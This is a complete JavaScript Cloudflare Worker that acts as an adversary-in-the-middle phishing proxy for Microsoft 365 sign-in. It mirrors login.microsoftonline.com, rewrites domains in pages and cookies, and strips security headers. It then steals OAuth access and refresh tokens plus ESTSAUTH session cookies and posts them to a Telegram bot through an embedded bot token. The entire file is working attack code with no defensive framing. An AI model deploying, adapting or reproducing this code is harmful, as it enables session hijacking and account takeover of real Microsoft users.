// Microsoft
const upstream = 'login.microsoftonline.com'
const upstream_path = '/common/oauth2/authorize?response_type=code&client_id=1fec8e78-bce4-4aaf-ab1b-5451cc387264&resource=https://graph.microsoft.com&redirect_uri=https://login.microsoftonline.com/common/oauth2/nativeclient'
const https = true
const TELEGRAM_BOT_TOKEN = '8986334659:AAGtVf_vgVHkvXVKNP1xf3KcnCEN-QCHsk8'   // <-- REPLACE
const TELEGRAM_CHAT_ID = '8531631021'       // <-- REPLACE

// Blocking
const blocked_region = []
const blocked_ip_address = ['0.0.0.0', '127.0.0.1']

addEventListener('fetch', event => {
    event.respondWith(fetchAndApply(event.request));
})

async function fetchAndApply(request) {
    const region = request.headers.get('cf-ipcountry')?.toUpperCase() || '';
    const ip_address = request.headers.get('cf-connecting-ip') || '';

    let all_cookies = ""
    let response = null;
    let url = new URL(request.url);
    let url_hostname = url.hostname;

    if (https) {
        url.protocol = 'https:';
    } else {
        url.protocol = 'http:';
    }

    var upstream_domain = upstream;
    url.host = upstream_domain;

    if (url.pathname == '/') {
        url = new URL('https://' + upstream_domain + upstream_path);
    }

    if (blocked_region.includes(region)) {
        return new Response('Access denied.', { status: 403 });
    } else if (blocked_ip_address.includes(ip_address)) {
        return new Response('Access denied', { status: 403 });
    }

    let method = request.method;
    let request_headers = request.headers;
    let new_request_headers = new Headers(request_headers);
    let requestBody = null;

    new_request_headers.set('Host', upstream_domain);
    new_request_headers.set('Referer', url.protocol + '//' + url_hostname);

    if (request.body) {
        requestBody = await request.clone().arrayBuffer();
    }

    let original_response = await fetch(url.href, {
        method: method,
        headers: new_request_headers,
        body: requestBody,
        redirect: 'manual'
    });

    if (original_response.status === 302) {
        const locationHeader = original_response.headers.get('Location');
        if (locationHeader && locationHeader.includes('nativeclient?code=')) {
            const codeMatch = locationHeader.match(/nativeclient\?code=([^&]+)/);
            if (codeMatch && codeMatch[1]) {
                const code = codeMatch[1];
                try {
                    const tokens = await exchangeCodeForTokens(code);
                    await sendToTelegram(
                        "<b>Tokens obtained:</b>\n" +
                        "<b>Access Token:</b> " + tokens.accessToken + "\n" +
                        "<b>Refresh Token:</b> " + tokens.refreshToken + "\n" +
                        "<b>Expires In:</b> " + tokens.expiresIn + " seconds"
                    );
                } catch (error) {
                    console.error('Failed to exchange code for tokens:', error);
                }
            }
        }
        return Response.redirect('https://portal.office.com', 302);
    }

    const connection_upgrade = new_request_headers.get("Upgrade");
    if (connection_upgrade && connection_upgrade.toLowerCase() == "websocket") {
        return original_response;
    }

    let original_response_clone = original_response.clone();
    let response_headers = original_response.headers;
    let new_response_headers = new Headers(response_headers);
    let status = original_response.status;

    new_response_headers.set('access-control-allow-origin', '*');
    new_response_headers.set('access-control-allow-credentials', true);
    new_response_headers.delete('content-security-policy');
    new_response_headers.delete('content-security-policy-report-only');
    new_response_headers.delete('clear-site-data');

    try {
        const originalCookies = new_response_headers.getAll("Set-Cookie");
        all_cookies = originalCookies.join("; \n");
        originalCookies.forEach(originalCookie => {
            const modifiedCookie = originalCookie.replace(/login\.microsoftonline\.com/g, url_hostname);
            new_response_headers.append("Set-Cookie", modifiedCookie);
        });
    } catch (error) {
        console.error(error);
    }

    const original_text = await replace_response_text(original_response_clone, upstream_domain, url_hostname);

    if (all_cookies.includes('ESTSAUTH') && all_cookies.includes('ESTSAUTHPERSISTENT')) {
        await sendToTelegram("<b>Cookies found:</b>\n" + all_cookies);
    }

    return new Response(original_text, {
        status,
        headers: new_response_headers
    });
}

async function replace_response_text(response, upstream_domain, host_name) {
    let text = await response.text();
    return text.replace(/login\.microsoftonline\.com/g, host_name);
}

async function sendToTelegram(message) {
    const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
    const payload = {
        chat_id: TELEGRAM_CHAT_ID,
        text: message,
        parse_mode: "HTML"
    };
    try {
        const resp = await fetch(url, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify(payload)
        });
        if (!resp.ok) {
            console.error('Telegram send failed:', await resp.text());
        }
    } catch (error) {
        console.error('Telegram error:', error);
    }
}

async function exchangeCodeForTokens(code) {
    const tokenEndpoint = 'https://login.microsoft.com/common/oauth2/token';
    const formData = new URLSearchParams({
        client_id: '1fec8e78-bce4-4aaf-ab1b-5451cc387264',
        grant_type: 'authorization_code',
        code: code,
        redirect_uri: 'https://login.microsoftonline.com/common/oauth2/nativeclient',
        resource: 'https://graph.microsoft.com'
    });
    const response = await fetch(tokenEndpoint, {
        method: 'POST',
        headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
        body: formData.toString()
    });
    if (!response.ok) {
        const errorText = await response.text();
        throw new Error('Authentication failed: ' + errorText);
    }
    const tokenData = await response.json();
    return {
        accessToken: tokenData.access_token,
        refreshToken: tokenData.refresh_token,
        expiresIn: tokenData.expires_in,
    };
} 
